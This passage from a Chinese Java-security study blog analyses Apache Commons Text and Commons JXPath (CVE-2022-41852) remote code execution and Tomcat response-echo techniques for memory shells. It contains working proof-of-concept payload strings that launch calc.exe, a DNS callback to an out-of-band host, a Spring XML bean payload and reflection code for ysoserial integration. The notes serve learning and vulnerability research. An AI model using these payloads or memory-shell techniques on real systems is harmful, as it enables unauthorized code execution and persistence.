&lt;p>&lt;a href="https://paper.seebug.org/1012/">WebLogic 安全研究报告&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://paper.seebug.org/487/">Weblogic XMLDecoder RCE分析&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://paper.seebug.org/909/">WebLogic RCE(CVE-2019-2725)漏洞之旅&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/afanti/p/10816028.html"># CVE-2019-2725二次反序列化EventData Gadget POC/JdbcRowSetImpl POC构造&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5448">cve-2019-2729挖掘思路 - cve-2019-2725 bypass&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://moonflower.fun/index.php/2022/01/30/251/">weblogic反序列化漏洞学习记录&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Java学习笔记Ⅺ</title><link>https://amiaaaz.github.io/2022/10/13/java-study-notes-11/</link><pubDate>Thu, 13 Oct 2022 23:38:14 +0800</pubDate><guid>https://amiaaaz.github.io/2022/10/13/java-study-notes-11/</guid><description>&lt;h2 id="apache-commons-text">apache commons text&lt;/h2>
&lt;blockquote>
&lt;p>apache commons text&amp;lt;1.10.0&lt;/p>
&lt;/blockquote>
&lt;p>在2022.9.24官方更新了1.10.0，虽然&lt;a href="https://commons.apache.org/proper/commons-text/changes-report.html#a1.10.0">release history&lt;/a>中没有提到漏洞，仔细看还是有点东西&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013191723800.png" alt="image-20221013191723800">&lt;/p>
&lt;p>也就是说在先前的版本中，&lt;code>StringSubstitutor.createInterpolator()&lt;/code>可能存在lookup相关的问题，看看官方&lt;a href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html">doc: StringSubstitutor&lt;/a> | &lt;a href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html">doc: StringLookupFactory&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013193942819.png" alt="image-20221013193942819">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013194321115.png" alt="image-20221013194321115">&lt;/p>
&lt;p>更新公告中将&lt;a href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html#dnsStringLookup--">dns&lt;/a>和&lt;a href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html#scriptStringLookup--">script&lt;/a>都移出了默认的Lookups，手搓一个poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">cText&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">payload1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">StringSubstitutor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createInterpolator&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;${dns:address|cText.30nux0.ceye.io}&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">payload2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">StringSubstitutor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createInterpolator&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;${script:js:new java.lang.ProcessBuilder(\&amp;#34;calc.exe\&amp;#34;).start()}&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013213632623.png" alt="image-20221013213632623">&lt;/p>
&lt;p>&lt;del>这未免也太逊了8&lt;/del>打个断点看看内部实现&lt;/p>
&lt;p>先看能rce的，调用栈如下&lt;/p>
&lt;pre tabindex="0">&lt;code>lookup:70, ScriptStringLookup (org.apache.commons.text.lookup)
lookup:135, InterpolatorStringLookup (org.apache.commons.text.lookup)
resolveVariable:1067, StringSubstitutor (org.apache.commons.text)
substitute:1433, StringSubstitutor (org.apache.commons.text)
substitute:1308, StringSubstitutor (org.apache.commons.text)
replace:816, StringSubstitutor (org.apache.commons.text)
main:7, cText (test1)
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013215231838.png" alt="image-20221013215231838">&lt;/p>
&lt;p>dns的那个同理，不再赘述&lt;/p>
&lt;h2 id="cve-2022-41852">CVE-2022-41852&lt;/h2>
&lt;blockquote>
&lt;p>Commons JXPath&amp;lt;=1.3&lt;/p>
&lt;/blockquote>
&lt;p>参考：&lt;a href="https://tttang.com/archive/1771/">浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)&lt;/a>&lt;/p>
&lt;p>JXPath支持标准的XPath，同时有很多附加功能，feature之一是&lt;a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions">动态执行代码&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017220404981.png" alt="image-20221017220404981">&lt;/p>
&lt;p>……这还能咋说，令人无语，本质和上面的commons text、log4j一样，都是设计了很多完全无用或者过度注重扩展性的功能，导致漏洞四处漏风；测试demo&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017221014855.png" alt="image-20221017221014855">&lt;/p>
&lt;p>打断点看看这个&amp;quot;feature&amp;quot;是怎么实现的；中间调用不是很多，捡重点看&lt;/p>
&lt;pre tabindex="0">&lt;code>getFunction:197, PackageFunctions (org.apache.commons.jxpath)
getFunction:753, JXPathContextReferenceImpl (org.apache.commons.jxpath.ri)
getFunction:140, RootContext (org.apache.commons.jxpath.ri.axes)
computeValue:96, ExtensionFunction (org.apache.commons.jxpath.ri.compiler)
getValue:353, JXPathContextReferenceImpl (org.apache.commons.jxpath.ri)
getValue:313, JXPathContextReferenceImpl (org.apache.commons.jxpath.ri)
main:9, test (test1)
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017221944986.png" alt="image-20221017221944986">&lt;/p>
&lt;p>注意这里处理methodName时支持两种调用方式，实例化构造函数ConstructFunction(constructor)和静态方法反射调用MethodFunction(method)，我们这里的demo是第二种方式，那还有没有更多的利用方式？&lt;/p>
&lt;ul>
&lt;li>针对构造函数：&lt;/li>
&lt;/ul>
&lt;p>org.springframework.context.support.FileSystemXmlApplicationContext.new(http://127.0.0.1/a.xml)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;beans&lt;/span> &lt;span style="color:#75af00">xmlns=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.springframework.org/schema/beans&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:xsi=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span> &lt;span style="color:#75af00">xsi:schemaLocation=&lt;/span>&lt;span style="color:#d88200">&amp;#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;bean&lt;/span> &lt;span style="color:#75af00">id=&lt;/span>&lt;span style="color:#d88200">&amp;#34;pb&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span> &lt;span style="color:#75af00">init-method=&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;constructor-arg&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;list&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;value&amp;gt;&lt;/span>calc.exe&lt;span style="color:#f92672">&amp;lt;/value&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/list&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/constructor-arg&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/bean&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/beans&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>针对静态方法&lt;/li>
&lt;/ul>
&lt;p>javax.naming.InitialContext.doLookup，jndi调用&lt;/p>
&lt;p>jdbc利用&lt;/p>
&lt;p>以上几种方式都有应用场景的局限，有没有什么仅用JXPath就可以的呢？官方doc中第三个demo给出了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">firstName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getAuthorsFirstName($book)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// As you can see, the target of the method is specified as the first parameter of the function.
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>也就意味着我们可以这样在JXPath中链式调用函数进行rce，无需其它依赖&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">firstName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec(java.lang.Runtime.getRuntime(),&amp;#39;calc.exe&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">firstName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;eval(getEngineByName(javax.script.ScriptEngineManager.new(),&amp;#39;js&amp;#39;),&amp;#39;java.lang.Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;)&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>帅！&lt;/p></description></item><item><title>Java学习笔记Ⅶ</title><link>https://amiaaaz.github.io/2022/09/13/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link><pubDate>Tue, 13 Sep 2022 11:27:04 +0800</pubDate><guid>https://amiaaaz.github.io/2022/09/13/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid><description>&lt;p>菜鸡水平，一篇笔记性质的纯水文，如有错漏还请指正QwQ&lt;/p>
&lt;p>*所有参考文章统一放文末&lt;/p>
&lt;h2 id="关于回显">关于回显&lt;/h2>
&lt;p>在我刚开始学内存马相关问题时，我其实没理解很多文章里在追求的“回显”是啥意思——因为起初都是拿着jsp来注内存马，所以对“回显”比较无感，直到开始学习反序列化注入内存马时才开始感受到“回显”的重要性；不同于jsp，通过反序列化注入时往往是能有一个点可以任意执行字节码，我们能控制的是一段java代码，显然不具备jsp那种得天独厚的条件（不再有拿来即用的request和response对象），就需要先从上下文环境中找到含有request/response的对象，然后再加以利用&lt;/p>
&lt;h2 id="linux文件描述符回显法">Linux文件描述符回显法&lt;/h2>
&lt;p>所以问题理所当然的就从回显 转换为了寻找含有request/response的对象，了吗？在此之前我们可以先换个角度看问题（短暂跑个大题）&lt;/p>
&lt;h3 id="文件描述符">文件描述符&lt;/h3>
&lt;p>众所周知，Linux中一切皆文件，网络连接也可以通过文件描述符来获取，比如&lt;code>/proc/net/tcp&lt;/code>和&lt;code>/proc/net/tcp6&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901172504445.png" alt="image-20220901172504445">&lt;/p>
&lt;p>这里local_address是16进制的写法，我们可以先转10进制再用php的long2ip来复原，或者python也可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">long&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0801A8C0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">long2ip&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">long&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">floor_list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">long&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">reversed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">divmod&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">num&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">floor_list&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">floor_list&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">reverse&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">floor_list&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">long2ip&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">long&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ip&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 192.168.1.8&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据remote ip对应socket连接的inode可以反查该进程的fd&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220906222029548.png" alt="image-20220906222029548">&lt;/p>
&lt;h3 id="实现回显">***实现回显&lt;/h3>
&lt;p>利用上面的技巧，调用java代码打开对应的fd并直接操作即可实现回显；说的简单，来个demo试试&lt;/p>
&lt;p>由于我实在是太菜了，这里本地一直没有调通，我直接就是一个滑跪&lt;/p>
&lt;p>之后会继续搞得，调通以后我必更新本文&lt;/p>
&lt;h2 id="寻找上下文response法">寻找上下文response法&lt;/h2>
&lt;p>上面那种方法虽然看着很强，但是仅局限Linux，要想寻求通杀还得专心找request/response&lt;/p>
&lt;h3 id="找response">找response&lt;/h3>
&lt;p>以springboot项目为例，写一个controller用作测试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Controller&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">VulnController&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@ResponseBody&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@RequestMapping&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/vuln&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">vuln&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在调用栈里可以看到这个response被一直传递，没有什么变化（ResponseFacade是门面模式下的产物 也是一直不变的）（变量之后的&lt;code>@xxxx&lt;/code>是对变量内容哈希的部分值，可以通过这个来判断变量是否发生变化）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901095631357.png" alt="image-20220901095631357">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901095734155.png" alt="image-20220901095734155">&lt;/p>
&lt;p>所以我们只要从这一堆堆栈里找任意一个类的response实例即可，为了确保尽可能的通杀 我们还需要只寻找tomcat部分的代码&lt;/p>
&lt;p>但是直接看代码会发现大部分的request/response是通过传参的方式进行传递（被invoke调用），为此我们应该关注这两个变量在中间有没有被记录过，并且被记录的值不应该是全局变量 而应该是ThreadLocal，这样才能获取到当前线程的请求信息；最好还是一个static静态变量，否则我们还需要获取那个变量所在的实例&lt;/p>
&lt;p>在&lt;code>org.apache.catalina.core.ApplicationFilterChain&lt;/code>这个类中找到了符合要求的变量（第一个发现的师傅tql）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901101726247.png" alt="image-20220901101726247">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220901101918880.png" alt="image-20220901101918880">&lt;/p>
&lt;p>在这个try catch中response被放入&lt;code>lastServicedResponse&lt;/code>，虽然if中的&lt;code>WRAP_SAME_OBJECT&lt;/code>是false，但是我们可以通过反射来修改，让它进入这个if，之后初始化&lt;code>lastServicedResponse&lt;/code>和&lt;code>lastServicedRequest&lt;/code>（默认为null），从&lt;code>lastServicedResponse&lt;/code>中获取当前请求response并回显内容&lt;/p>
&lt;h3 id="接入ysoserial">接入ysoserial&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 反射获取变量
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">WRAP_SAME_OBJECT_FIELD&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationDispatcher&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WRAP_SAME_OBJECT&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">lastServicedRequestField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ApplicationFilterChain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">lastServicedResponseField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ApplicationFilterChain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedResponse&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">WRAP_SAME_OBJECT_FIELD&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lastServicedRequestField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lastServicedResponseField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过modifiers反射修改static final字段
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">modifiersFiled&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">modifiersFiled&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
